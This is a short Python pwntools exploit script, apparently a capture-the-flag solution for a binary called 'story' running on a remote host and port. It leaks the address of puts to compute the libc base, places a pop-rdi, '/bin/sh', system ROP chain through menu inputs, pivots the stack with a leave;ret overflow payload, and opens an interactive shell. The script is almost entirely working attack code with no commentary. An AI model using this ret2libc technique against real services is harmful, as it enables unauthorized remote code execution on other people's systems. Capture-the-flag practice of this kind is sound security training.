from pwn import *

# p = process('./story')
p = remote('node.yuzhian.com.cn', 33795)
elf = ELF('./story')
# lib = ELF('/lib/x86_64-linux-gnu/libc.so.6')
lib = ELF('./libc.so.6')
# 2->1->3
p.sendline(b'4')
p.recvuntil(b'0x')
puts_addr = int(p.recv(12), 16)
base_addr = puts_addr - lib.symbols['puts']
print(hex(base_addr))
pop_rdi = 0x0000000000401573
system_addr = base_addr + lib.symbols['system']
bin_addr = base_addr + next(lib.search(b'/bin/sh'))
leave_ret = 0x000000000040139e
p.sendline(b'2')
p.sendline(p64(pop_rdi))
p.sendline(b'1')
p.sendline(p64(bin_addr))
p.sendline(b'3')
p.sendline(p64(system_addr))
p.sendline(b'4')
payload = b'a' * 0xa + p64(0x405098) + p64(leave_ret)
p.sendline(payload)
p.interactive()